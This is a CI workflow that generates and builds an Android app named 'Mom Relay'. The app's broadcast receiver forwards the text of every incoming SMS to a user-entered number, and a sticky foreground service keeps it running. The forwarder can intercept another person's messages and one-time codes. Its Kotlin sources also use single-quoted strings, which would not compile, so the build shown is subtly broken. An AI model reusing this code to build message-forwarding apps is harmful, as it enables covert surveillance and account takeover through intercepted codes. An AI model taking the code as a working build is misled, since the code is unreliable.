name: Master Build
on: [push, workflow_dispatch]

jobs:
  build-and-sign:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - uses: actions/setup-java@v3
        with:
          distribution: 'zulu'
          java-version: '17'
          
      # STEP 1: FORCE CLEANUP & GENERATE PROJECT
      # This script wipes everything first to prevent 'FileExists' errors.
      - name: Generate Robust Project Structure
        run: |
          # 1. NUCLEAR CLEANUP
          rm -rf app settings.gradle build.gradle gradle.properties
          
          # 2. START PYTHON GENERATOR
          python3 -c "
          import os
          
          def write_file(path, content):
              # Ensure directory exists
              directory = os.path.dirname(path)
              if directory and not os.path.exists(directory):
                  os.makedirs(directory)
              # Write content
              with open(path, 'w') as f:
                  f.write(content)

          # --- SETTINGS.GRADLE ---
          write_file('settings.gradle', \"include ':app'\")

          # --- ROOT BUILD.GRADLE ---
          root_build = \"\"\"
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.1.1'
                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.9.0'
              }
          }
          allprojects { repositories { google(); mavenCentral() } }
          task clean(type: Delete) { delete rootProject.buildDir }
          \"\"\"
          write_file('build.gradle', root_build)

          # --- APP BUILD.GRADLE ---
          app_build = \"\"\"
          plugins {
              id 'com.android.application'
              id 'org.jetbrains.kotlin.android'
          }
          android {
              namespace 'com.momrelay'
              compileSdk 34
              defaultConfig {
                  applicationId 'com.momrelay'
                  minSdk 26
                  targetSdk 34
                  versionCode 5
                  versionName '5.0-Clean'
              }
              buildFeatures { viewBinding true }
          }
          dependencies {
              implementation 'androidx.core:core-ktx:1.12.0'
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.google.android.material:material:1.11.0'
              implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
          }
          \"\"\"
          write_file('app/build.gradle', app_build)

          # --- ANDROID MANIFEST (ANDROID 15 COMPLIANT) ---
          manifest = \"\"\"<?xml version='1.0' encoding='utf-8'?>
          <manifest xmlns:android='http://schemas.android.com/apk/res/android'
              xmlns:tools='http://schemas.android.com/tools'>
          
              <uses-permission android:name='android.permission.RECEIVE_SMS' />
              <uses-permission android:name='android.permission.READ_SMS' />
              <uses-permission android:name='android.permission.SEND_SMS' />
              <uses-permission android:name='android.permission.READ_PHONE_STATE' />
              <uses-permission android:name='android.permission.FOREGROUND_SERVICE' />
              <uses-permission android:name='android.permission.FOREGROUND_SERVICE_DATA_SYNC' />
              <uses-permission android:name='android.permission.POST_NOTIFICATIONS' />

              <application
                  android:label='Mom Relay'
                  android:theme='@style/Theme.AppCompat.Light.NoActionBar'
                  android:allowBackup='true'>
                  
                  <activity
                      android:name='.MainActivity'
                      android:exported='true'>
                      <intent-filter>
                          <action android:name='android.intent.action.MAIN' />
                          <category android:name='android.intent.category.LAUNCHER' />
                      </intent-filter>
                  </activity>

                  <service 
                      android:name='.RelayService'
                      android:enabled='true'
                      android:exported='false'
                      android:foregroundServiceType='dataSync' />

                  <receiver
                      android:name='.SmsReceiver'
                      android:enabled='true'
                      android:exported='true'
                      android:permission='android.permission.BROADCAST_SMS'>
                      <intent-filter android:priority='999'>
                          <action android:name='android.provider.Telephony.SMS_RECEIVED' />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          \"\"\"
          write_file('app/src/main/AndroidManifest.xml', manifest)

          # --- MAIN ACTIVITY ---
          main_activity = \"\"\"
          package com.momrelay
          import android.os.Bundle
          import android.widget.*
          import android.view.Gravity
          import android.content.Intent
          import androidx.appcompat.app.AppCompatActivity
          import android.Manifest
          import android.content.pm.PackageManager
          import androidx.core.app.ActivityCompat
          import android.os.Build

          class MainActivity : AppCompatActivity() {
              override fun onCreate(s: Bundle?) {
                  super.onCreate(s)
                  val l = LinearLayout(this).apply {
                      orientation = LinearLayout.VERTICAL
                      gravity = Gravity.CENTER
                      setPadding(50,50,50,50)
                  }
                  val t = TextView(this).apply { text = 'MOM RELAY'; textSize=24f; gravity=Gravity.CENTER }
                  val i = EditText(this).apply { hint = 'TARGET NUMBER' }
                  val b = Button(this).apply { text = 'ACTIVATE' }
                  
                  l.addView(t); l.addView(i); l.addView(b)
                  setContentView(l)

                  val p = getSharedPreferences('Relay', MODE_PRIVATE)
                  i.setText(p.getString('PHONE', ''))

                  b.setOnClickListener {
                      val perms = mutableListOf(
                          Manifest.permission.RECEIVE_SMS,
                          Manifest.permission.SEND_SMS,
                          Manifest.permission.READ_PHONE_STATE
                      )
                      if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.POST_NOTIFICATIONS)
                      ActivityCompat.requestPermissions(this, perms.toTypedArray(), 101)
                      
                      p.edit().putString('PHONE', i.text.toString()).putBoolean('ACTIVE', true).apply()
                      
                      val intent = Intent(this, RelayService::class.java)
                      if (Build.VERSION.SDK_INT >= 26) startForegroundService(intent) else startService(intent)
                      
                      Toast.makeText(this, 'ACTIVE!', Toast.LENGTH_LONG).show()
                  }
              }
          }
          \"\"\"
          write_file('app/src/main/java/com/momrelay/MainActivity.kt', main_activity)

          # --- RELAY SERVICE ---
          service_code = \"\"\"
          package com.momrelay
          import android.app.*
          import android.content.Intent
          import android.os.IBinder
          import androidx.core.app.NotificationCompat
          import android.os.Build
          import android.content.pm.ServiceInfo

          class RelayService : Service() {
              override fun onBind(i: Intent?): IBinder? = null
              override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
                  if (Build.VERSION.SDK_INT >= 26) {
                      val c = NotificationChannel('Relay', 'Relay Service', NotificationManager.IMPORTANCE_LOW)
                      getSystemService(NotificationManager::class.java).createNotificationChannel(c)
                  }
                  val n = NotificationCompat.Builder(this, 'Relay')
                      .setContentTitle('Relay Active')
                      .setSmallIcon(android.R.drawable.ic_dialog_email)
                      .build()
                  
                  if (Build.VERSION.SDK_INT >= 34) {
                      startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                  } else {
                      startForeground(1, n)
                  }
                  return START_STICKY
              }
          }
          \"\"\"
          write_file('app/src/main/java/com/momrelay/RelayService.kt', service_code)

          # --- SMS RECEIVER ---
          receiver_code = \"\"\"
          package com.momrelay
          import android.content.*
          import android.telephony.*

          class SmsReceiver : BroadcastReceiver() {
              override fun onReceive(c: Context, i: Intent) {
                  if (i.action != 'android.provider.Telephony.SMS_RECEIVED') return
                  val p = c.getSharedPreferences('Relay', Context.MODE_PRIVATE)
                  val t = p.getString('PHONE', '') ?: return
                  if (t.length < 3) return
                  
                  val b = i.extras ?: return
                  val pdus = b.get('pdus') as Array<Any>?
                  val sms = SmsManager.getDefault()
                  pdus?.forEach {
                      val m = SmsMessage.createFromPdu(it as ByteArray, b.getString('format'))
                      try { sms.sendTextMessage(t, null, 'Fwd: ' + m.messageBody, null, null) } catch (e: Exception) {}
                  }
              }
          }
          \"\"\"
          write_file('app/src/main/java/com/momrelay/SmsReceiver.kt', receiver_code)

          # --- GRADLE PROPERTIES ---
          write_file('gradle.properties', 'org.gradle.jvmargs=-Xmx2048m\\nandroid.useAndroidX=true')
          "

      # STEP 2: SETUP GRADLE 8.2
      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.2'

      # STEP 3: BUILD
      - name: Build APK
        run: gradle assembleDebug --stacktrace

      # STEP 4: UPLOAD
      - uses: actions/upload-artifact@v4
        with:
          name: MomRelay-App-v5
          path: app/build/outputs/apk/debug/app-debug.apk
